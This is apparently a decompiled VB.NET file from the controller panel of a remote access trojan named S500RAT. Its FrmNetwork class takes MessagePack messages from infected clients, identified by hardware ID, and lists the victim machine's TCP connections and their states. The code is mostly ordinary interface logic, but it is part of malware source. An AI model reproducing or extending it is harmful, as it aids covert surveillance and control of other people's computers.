Imports System
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x02000054 RID: 84
	Public Class FrmNetwork
		' Token: 0x0600119D RID: 4509 RVA: 0x0009B07C File Offset: 0x0009927C
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			' The following expression was wrapped in a checked-statement
			Try
				Dim formTCPConnection As FormTCPConnection = CType(Application.OpenForms("FormTCPConnection" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormTCPConnection)
				Dim flag As Boolean = formTCPConnection IsNot Nothing
				If flag Then
					Dim flag2 As Boolean = formTCPConnection.Client Is Nothing
					If flag2 Then
						formTCPConnection.Client = client
						formTCPConnection.ListConnection.Enabled = True
						formTCPConnection.Timer1.Enabled = True
					End If
					formTCPConnection.ListConnection.Rows.Clear()
					Dim asString As String = unpack_msgpack.ForcePathObject("Message").AsString
					Dim array As String() = asString.Split(New String() { "-=>" }, StringSplitOptions.None)
					Dim num As Integer = array.Length - 1
					For i As Integer = 0 To num
						Dim flag3 As Boolean = array(i).Length > 0
						If flag3 Then
							formTCPConnection.ListConnection.Rows.Add(New Object() { NewLateBinding.LateGet(formTCPConnection.ImageList1.Images, Nothing, "Item", New Object() { Operators.ConcatenateObject(Me.CheckState(array(i + 4)), ".png") }, Nothing, Nothing, Nothing), array(i), array(i + 1), array(i + 3), array(i + 2), array(i + 4) })
						End If
						i += 4
					Next
					formTCPConnection.ConnectionNum.Text = "Connection [ " + Conversions.ToString(Conversions.ToInteger(formTCPConnection.ListConnection.Rows.Count)) + " ]"
				End If
			Catch ex As Exception
				Interaction.MsgBox("err : " + ex.ToString(), MsgBoxStyle.OkOnly, Nothing)
			End Try
		End Sub

		' Token: 0x0600119E RID: 4510 RVA: 0x0009B264 File Offset: 0x00099464
		Public Function CheckState(Txt As String) As Object
			Dim text As String = "Closed"
			Dim text2 As String = "Listen"
			Dim text3 As String = "Sent"
			Dim text4 As String = "Received"
			Dim text5 As String = "Established"
			Dim text6 As String = "Closeing"
			Dim flag As Boolean = Txt.Contains(text) OrElse Operators.CompareString(Txt, text, False) = 0
			Dim result As String
			If flag Then
				result = text
			Else
				Dim flag2 As Boolean = Txt.Contains(text2) OrElse Operators.CompareString(Txt, text2, False) = 0
				If flag2 Then
					result = text2
				Else
					Dim flag3 As Boolean = Txt.Contains(text3) OrElse Operators.CompareString(Txt, text3, False) = 0
					If flag3 Then
						result = text3
					Else
						Dim flag4 As Boolean = Txt.Contains(text4) OrElse Operators.CompareString(Txt, text4, False) = 0
						If flag4 Then
							result = text4
						Else
							Dim flag5 As Boolean = Txt.Contains(text5) OrElse Operators.CompareString(Txt, text5, False) = 0
							If flag5 Then
								result = text5
							Else
								Dim flag6 As Boolean = Txt.Contains(text6) OrElse Operators.CompareString(Txt, text6, False) = 0
								If flag6 Then
									result = text6
								Else
									result = "Other"
								End If
							End If
						End If
					End If
				End If
			End If
			Return result
		End Function
	End Class
End Namespace
